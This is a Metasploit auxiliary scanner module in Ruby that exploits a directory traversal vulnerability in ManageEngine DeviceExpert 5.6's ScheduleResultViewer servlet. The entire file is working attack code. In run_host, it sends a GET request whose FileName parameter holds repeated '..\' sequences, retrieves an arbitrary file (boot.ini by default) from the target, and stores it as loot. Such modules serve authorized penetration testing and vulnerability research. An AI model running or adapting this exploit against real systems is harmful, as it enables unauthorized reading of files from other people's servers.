##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ManageEngine DeviceExpert 5.6 ScheduleResultViewer FileName Traversal',
			'Description'    => %q{
					This module exploits a directory traversal vulnerability found in ManageEngine
				DeviceExpert's ScheduleResultViewer Servlet.  This is done by using
				"..\..\..\..\..\..\..\..\..\..\" in the path in order to retrieve a file on a
				vulnerable machine.  Please note that the SSL option is required in order to send
				HTTP requests.
			},
			'References'     =>
				[
					[ 'OSVDB', '80262'],
					[ 'URL', 'http://retrogod.altervista.org/9sg_me_adv.htm' ]
				],
			'Author'         =>
				[
					'rgod',   #Discovery
					'sinn3r'
				],
			'License'        => MSF_LICENSE,
			'DisclosureDate' => "Mar 18 2012"
		))

		register_options(
			[
				Opt::RPORT(6060),
				OptBool.new('SSL',   [true, 'Use SSL', true]),
				OptString.new('FILEPATH', [true, 'The name of the file to download', 'boot.ini'])
			], self.class)

		deregister_options('RHOST')
	end

	def run_host(ip)
		traverse = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
		filename = datastore['FILEPATH']

		res = send_request_raw({
			'uri' => "/scheduleresult.de/?FileName=#{traverse}#{filename}",
			'method' => 'GET'
		}, 25)

		if res
			print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
		else
			print_error("Unable to communicate with #{ip}:#{rport}")
			return
		end

		if res.body.empty?
			print_error("#{ip}:#{rport} - no file downloaded (empty)")
		else
			fname = File.basename(datastore['FILEPATH'])
			path = store_loot(
				'manageengine.http',
				'application/octet-stream',
				ip,
				res.body,
				fname)

			print_status("#{ip}:#{rport} - File saved in: #{path}")
		end
	end

end